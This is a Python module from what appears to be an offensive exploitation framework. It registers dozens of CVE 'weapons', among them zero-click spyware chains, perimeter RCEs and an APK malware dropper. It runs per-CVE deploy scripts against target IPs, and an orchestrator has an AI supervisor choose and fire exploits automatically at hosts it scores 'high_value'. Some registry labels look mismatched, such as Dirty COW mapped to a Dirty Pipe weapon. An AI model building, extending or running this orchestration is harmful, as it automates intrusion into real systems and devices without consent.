"""quantum.weapons.registry — ZERO_DAY_REGISTRY + fire contract + orchestrator."""
from __future__ import annotations

import json
import os
import subprocess

from quantum.core.logging import log

# repo-root/exploit_payloads — per-CVE operator tooling folders
PAYLOADS_DIR = os.path.join(
    os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(
        os.path.abspath(__file__))))), "exploit_payloads")

# ----------------------------------------------------------------------------
# ZERO_DAY_REGISTRY — weapon entries reference callables BY NAME; resolution
# happens at fire-time via resolve_weapon() so tiers stay lazy-importable.
# ----------------------------------------------------------------------------

ZERO_DAY_REGISTRY = {
    # ---- legacy ----
    "CVE-2020-1472": {"name": "Zerologon", "tier": "legacy", "weapon": "check_zerologon"},
    "CVE-2017-0144": {"name": "EternalBlue", "tier": "legacy", "weapon": "check_ms17010"},
    "CVE-2021-1675": {"name": "PrintNightmare", "tier": "legacy", "weapon": "check_printnightmare"},
    "CVE-2021-36942": {"name": "PetitPotam", "tier": "legacy", "weapon": "check_petitpotam"},
    "CVE-2022-30190": {"name": "Follina MSDT", "tier": "legacy", "weapon": "check_follina"},
    "CVE-2021-26855": {"name": "ProxyLogon", "tier": "legacy", "weapon": "check_proxylogon"},
    # ---- V3_HIGH ----
    "CVE-2021-44228": {"name": "Log4Shell", "tier": "V3_HIGH", "weapon": "v3_log4shell"},
    "CVE-2024-3400": {"name": "PAN-OS GlobalProtect", "tier": "V3_HIGH", "weapon": "v3_panos_cmd"},
    "CVE-2023-4966": {"name": "Citrix Bleed", "tier": "V3_HIGH", "weapon": "v3_citrixbleed"},
    "CVE-2019-19781": {"name": "Citrix Path Traversal", "tier": "V3_HIGH", "weapon": "v3_citrix_path"},
    "CVE-2023-20198": {"name": "IOS XE Web UI", "tier": "V3_HIGH", "weapon": "v3_ios_admin"},
    "CVE-2022-26134": {"name": "Confluence OGNL", "tier": "V3_HIGH", "weapon": "v3_confluence_ognl"},
    "CVE-2020-14882": {"name": "WebLogic Console", "tier": "V3_HIGH", "weapon": "v3_weblogic_console"},
    "CVE-2021-40444": {"name": "MSHTML Maldoc", "tier": "V3_HIGH", "weapon": "v3_mshtml_maldoc"},
    # ---- V3_MED ----
    "CVE-2017-7494": {"name": "SambaCry", "tier": "V3_MED", "weapon": "v3_sambacry"},
    "CVE-2021-21972": {"name": "vCenter Upload", "tier": "V3_MED", "weapon": "v3_vcenter_upload"},
    "CVE-2022-0847": {"name": "Dirty Pipe", "tier": "V3_HIGH", "weapon": "v3_dirtypipe"},
    "CVE-2016-5195": {"name": "Dirty COW", "tier": "V3_MED", "weapon": "v3_dirtypipe"},
    # ---- V3_CHECK ----
    "CVE-2023-34362": {"name": "MOVEit SQLi", "tier": "V3_CHECK", "weapon": "v3_moveit_probe"},
    "CVE-2021-3156": {"name": "Baron Samedit", "tier": "V3_CHECK", "weapon": "check_baron_samedit"},
    "CVE-2021-4034": {"name": "PwnKit", "tier": "V3_CHECK", "weapon": "check_pwnkit"},
    "CVE-2023-2640": {"name": "Overlayfs GameOver", "tier": "V3_CHECK", "weapon": "check_overlayfs"},
    "CVE-2023-32233": {"name": "nf_tables UAF", "tier": "V3_CHECK", "weapon": "check_nftables_uaf"},
    "CVE-2024-1086": {"name": "nf_tables dbl-free", "tier": "V3_CHECK", "weapon": "check_nftables_dblfree"},
    "CVE-2019-3568": {"name": "WhatsApp VOIP", "tier": "V3_CHECK", "weapon": "check_whatsapp_voip"},
    "CVE-2023-4863": {"name": "libwebp BLASTPAST", "tier": "V3_CHECK", "weapon": "check_libwebp"},
    "CVE-2023-41064": {"name": "Apple ImageIO", "tier": "V3_CHECK", "weapon": "check_apple_imageio"},
    "CVE-2021-30858": {"name": "WebKit Escape", "tier": "V3_CHECK", "weapon": "check_webkit_escape"},
    "CVE-2022-21894": {"name": "BootHole", "tier": "V3_CHECK", "weapon": "check_boothole"},
    # ---- bluetooth (BlueBorne family + BlackBED-class BLE) ----
    "CVE-2017-0781": {"name": "BlueBorne BNEP", "tier": "V3_CHECK", "weapon": "check_blueborne_bnep"},
    "CVE-2017-0785": {"name": "BlueBorne SDP", "tier": "V3_CHECK", "weapon": "check_blueborne_sdp"},
    "CVE-2018-5383": {"name": "Bluetooth KNOB", "tier": "V3_CHECK", "weapon": "check_knob"},
    "BLACKBED-BLE": {"name": "BlackBED BLE", "tier": "V3_CHECK", "weapon": "check_blackbed"},
    "CVE-2020-0022": {"name": "BlueFrag L2CAP", "tier": "V3_CHECK", "weapon": "check_bluefrag"},
    "CVE-2017-13077": {"name": "KRACK WPA2", "tier": "V3_CHECK", "weapon": "check_krack"},
    # ---- adb (adbd TLS auth bypass) ----
    "CVE-2026-0073": {"name": "adbd TLS Auth Bypass", "tier": "V3_CHECK", "weapon": "check_adb_tls_bypass"},
    # ---- payload-folder weapons (exploit_payloads/, per-CVE operator tooling).
    # "folder" = subfolder of exploit_payloads/ containing deploy.py;
    # "needs_target" = default fire() probes the target, otherwise fire()
    # forges the delivery payload to a temp file (operators pass
    # params={"args": [...]} to control the full CLI).
    # ---- zero-click delivery set (client-side, 2022-2026) ----
    "CVE-2023-41061": {"name": "BlastPass Wallet Fake Token", "tier": "ZERO-CLICK",
                       "folder": "CVE-2023-41061-blastpass-wallet"},
    "CVE-2023-24033": {"name": "Exynos Baseband (Theater Stage)", "tier": "ZERO-CLICK",
                       "folder": "CVE-2023-24033-exynos-baseband"},
    "CVE-2022-44319": {"name": "Samsung Baseband Memory Corrupt", "tier": "ZERO-CLICK",
                       "folder": "CVE-2022-44319-samsung-baseband"},
    "CVE-2023-32434": {"name": "Triangulation Kernel UAF", "tier": "ZERO-CLICK",
                       "folder": "CVE-2023-32434-triangulation-kernel"},
    "CVE-2023-32435": {"name": "Triangulation WebKit Code Exec", "tier": "ZERO-CLICK",
                       "folder": "CVE-2023-32435-triangulation-webkit"},
    "CVE-2023-42924": {"name": "WebKit ITW WebKit URL Handler", "tier": "ZERO-CLICK",
                       "folder": "CVE-2023-42924-webkit-itw"},
    "CVE-2024-23225": {"name": "iOS Kernel RTKit In-the-Wild", "tier": "ZERO-CLICK",
                       "folder": "CVE-2024-23225-ios-kernel"},
    "CVE-2024-4438": {"name": "Intellexa WebKit Chain (4438/4439)", "tier": "ZERO-CLICK",
                      "folder": "CVE-2024-4438-webkit-intellexa"},
    "CVE-2025-24085": {"name": "WebKit ITW UI Launch", "tier": "ZERO-CLICK",
                      "folder": "CVE-2025-24085-webkit-itw"},
    "CVE-2025-41300": {"name": "Pegasus WebKit Chain (41300/41301)", "tier": "ZERO-CLICK",
                      "folder": "CVE-2025-41300-pegasus-webkit"},
    "CVE-2022-27492": {"name": "WhatsApp libmultiple UAF", "tier": "ZERO-CLICK",
                      "folder": "CVE-2022-27492-whatsapp-libmultiple"},
    "CVE-2023-23397": {"name": "Outlook NTLM Leak", "tier": "ZERO-CLICK",
                       "folder": "CVE-2023-23397-outlook-ntlm-leak"},
    "CVE-2023-36884": {"name": "Office HTML RCE (ITW)", "tier": "ZERO-CLICK",
                      "folder": "CVE-2023-36884-office-html"},
    "CVE-2025-32711": {"name": "EchoLeak M365 AI Prompt Injection", "tier": "ZERO-CLICK",
                      "folder": "CVE-2025-32711-echoleak"},
    # ---- perimeter zero-day set (2021-2025) ----
    "CVE-2021-34473": {"name": "ProxyShell Exchange SSRF", "tier": "PERIMETER", "needs_target": True,
                       "folder": "CVE-2021-34473-proxyshell"},
    "CVE-2022-41040": {"name": "ProxyNotShell Exchange SSRF", "tier": "PERIMETER", "needs_target": True,
                      "folder": "CVE-2022-41040-proxynotshell"},
    "CVE-2022-22965": {"name": "Spring4Shell ClassLoader", "tier": "PERIMETER", "needs_target": True,
                      "folder": "CVE-2022-22965-spring4shell"},
    "CVE-2021-35464": {"name": "ForgeRM/ForgeRock Groovy Gadget", "tier": "PERIMETER", "needs_target": True,
                      "folder": "CVE-2021-35464-forgerock"},
    "CVE-2023-27350": {"name": "PaperCut NG/MF Unauth RCE", "tier": "PERIMETER", "needs_target": True,
                      "folder": "CVE-2023-27350-papercut"},
    "CVE-2023-0669": {"name": "GoAnywhere MFT Pre-Auth RCE", "tier": "PERIMETER", "needs_target": True,
                     "folder": "CVE-2023-0669-goanywhere"},
    "CVE-2023-35078": {"name": "Ivanti EPMM Unauth API", "tier": "PERIMETER", "needs_target": True,
                      "folder": "CVE-2023-35078-ivanti-epmm"},
    "CVE-2024-47575": {"name": "FortiManager Missing Auth (FortiJump)", "tier": "PERIMETER", "needs_target": True,
                      "folder": "CVE-2024-47575-fortimanager"},
    "CVE-2024-1709": {"name": "ScreenConnect Auth Bypass", "tier": "PERIMETER", "needs_target": True,
                     "folder": "CVE-2024-1709-screenconnect"},
    "CVE-2025-31324": {"name": "SAP NetWeaver Visual Studio RCE", "tier": "PERIMETER", "needs_target": True,
                      "folder": "CVE-2025-31324-sap-netweaver"},
    "CVE-2025-5777": {"name": "Citrix Bleed 2 Session Hijack", "tier": "PERIMETER", "needs_target": True,
                     "folder": "CVE-2025-5777-citrix-bleed2"},
    "CVE-2025-0282": {"name": "Ivanti Connect Secure Stack Overflow", "tier": "PERIMETER", "needs_target": True,
                     "folder": "CVE-2025-0282-ivanti-connect-secure"},
    "CVE-2024-6387": {"name": "regreSSHion OpenSSH RCE", "tier": "PERIMETER", "needs_target": True,
                     "folder": "CVE-2024-6387-regresssion"},
    # ---- malware tooling ----
    "MALWARE-APK-WRAPPER-NECRO": {"name": "APK Wrapper (Necro-class dropper)",
                                  "tier": "MALWARE",
                                  "folder": "MALWARE-apk-wrapper-necro-class"},
}


def _fire_folder(cve, entry, ip, params):
    """Run a payload-folder deploy.py. Default args: --target probe when the
    entry needs a target, else forge the delivery payload to a temp file.
    Operators override the full CLI via params={"args": [...]}. Never raises;
    deploy.py's own JSON + exit-code contract is passed through."""
    import sys
    import tempfile
    params = params or {}
    deploy = os.path.join(PAYLOADS_DIR, entry["folder"], "deploy.py")
    if not os.path.isfile(deploy):
        return {"cve": cve, "status": "error", "error": "deploy.py missing"}
    args = [str(a) for a in (params.get("args") or [])]
    if not args:
        if entry.get("needs_target"):
            args = ["--target", str(ip), "--timeout", str(params.get("timeout", 5))]
        else:
            outdir = os.path.join(tempfile.gettempdir(), "qcli")
            try:
                os.makedirs(outdir, exist_ok=True)
            except OSError:
                outdir = tempfile.gettempdir()
            args = ["--out", os.path.join(outdir, cve.replace("/", "_") + ".bin")]
    try:
        proc = subprocess.run(
            [sys.executable, deploy, *args],
            capture_output=True, text=True,
            timeout=float(params.get("proc_timeout", 90)),
            cwd=os.path.dirname(deploy))
    except Exception as exc:
        return {"cve": cve, "status": "error", "error": str(exc)}
    try:
        payload = json.loads(proc.stdout or "{}")
    except Exception:
        payload = None
    status = "ok" if proc.returncode == 0 else "error"
    if isinstance(payload, dict):
        payload.setdefault("cve", cve)
        payload.setdefault("status", status)
        return payload
    if payload is not None:
        return {"cve": cve, "status": status, "result": payload}
    return {"cve": cve, "status": status,
            "raw": ((proc.stdout or "") + (proc.stderr or ""))[:2000]}


def resolve_weapon(name):
    """Resolve a weapon name (string) to its callable, tier by tier."""
    import quantum.weapons.kernel_v3 as _k
    import quantum.weapons.legacy as _l
    import quantum.weapons.media_v3 as _m
    import quantum.weapons.remote_v3 as _r
    import quantum.weapons.bluetooth as _b
    import quantum.weapons.adb as _a
    for mod in (_r, _k, _m, _l, _b, _a):
        fn = getattr(mod, name, None)
        if callable(fn):
            return fn
    return None


class _Registry:
    """registry.fire(cve, ip, params) — every weapon string in
    ZERO_DAY_REGISTRY resolves to a callable; never raises."""

    def __contains__(self, cve):
        return cve in ZERO_DAY_REGISTRY

    def __iter__(self):
        return iter(ZERO_DAY_REGISTRY)

    def cves(self):
        return list(ZERO_DAY_REGISTRY)

    def fire(self, cve, ip, params=None):
        entry = ZERO_DAY_REGISTRY.get(cve)
        if not entry:
            raise KeyError(f"unknown CVE: {cve}")
        if entry.get("folder"):
            return _fire_folder(cve, entry, ip, params)
        fn = resolve_weapon(entry["weapon"])
        if not callable(fn):
            return {"cve": cve, "status": "error",
                    "error": f"weapon {entry['weapon']!r} unresolved"}
        try:
            res = fn(ip, params)
        except Exception as exc:
            return {"cve": cve, "status": "error", "error": str(exc)}
        if isinstance(res, dict):
            return res
        return {"cve": cve, "status": "ok", "result": res}


registry = _Registry()


class ExploitOrchestrator:
    """V3 registry-aware fire stage + appliance-aware auto-exploit."""

    def __init__(self):
        from quantum.ai.supervisor import AI_Supervisor
        self.ai = AI_Supervisor()

    def source_exploits(self, keyword):
        found = []
        try:
            try:
                out = subprocess.check_output(["searchsploit", keyword], text=True, timeout=30)
                found += [{"src": "exploit-db", "match": l} for l in out.splitlines() if keyword in l]
            except FileNotFoundError:
                from quantum.core.opsec import OPSEC
                r = OPSEC.web("https://api.github.com/search/repositories",
                              params={"q": f"{keyword} exploit"}, timeout=10)
                found += [{"src": "github", "match": i["full_name"]} for i in r.json().get("items", [])[:10]]
        except Exception as e:
            log(f"exploit-db search: {e}", "WARN")
        return found

    def fire(self, cve, ip, params=None):
        if cve not in ZERO_DAY_REGISTRY:
            log(f"fire: '{cve}' not in registry", "WARN"); return {"error": cve}
        rec = ZERO_DAY_REGISTRY[cve]
        if rec.get("folder"):
            return _fire_folder(cve, rec, ip, params)
        fn = resolve_weapon(rec["weapon"])
        if not callable(fn):
            return {"cve": cve, "status": "error", "error": f"weapon {rec['weapon']!r} unresolved"}
        return fn(ip, params)

    def auto_exploit(self, ip, params=None, force=False):
        from quantum.recon.fingerprint import Validator
        from quantum.recon.scan import ReconModule
        fp = ReconModule().fingerprint(ip)
        verdict = Validator().score(ip, fp)
        if verdict["decision"] != "high_value" and not force:
            log(f"auto_exploit skipped {ip} (VALIDATOR: {verdict['score']})", "ATK")
            return {"skipped": ip, "validator": verdict}
        cve = self.ai.plan_attack(fp)   # returns a bare CVE id (AI or QBrain)
        if cve in ZERO_DAY_REGISTRY:
            r = self.fire(cve, ip, params)
            log(f"auto_exploit: {ip} -> {cve} ({ZERO_DAY_REGISTRY[cve]['name']})", "ATK")
            return r
        # registry march fallback (deterministic)
        for cve, ent in ZERO_DAY_REGISTRY.items():
            probe = {"CVE-2017-0144": fp.get("ms17_010") is True,
                     "CVE-2020-1472": any(p in fp.get("ports", []) for p in (445, 135, 3389)),
                     "CVE-2021-44228": any(p in fp.get("ports", []) for p in (80, 443, 8080, 8000, 8443)),
                     "CVE-2021-26855": any(p in fp.get("ports", []) for p in (80, 443))}.get(cve, False)
            if probe:
                log(f"auto_exploit: no dedicated match for '{cve}' — registry march fires {cve}", "ATK")
                return self.fire(cve, ip, params)
        return {"error": "no match in registry"}
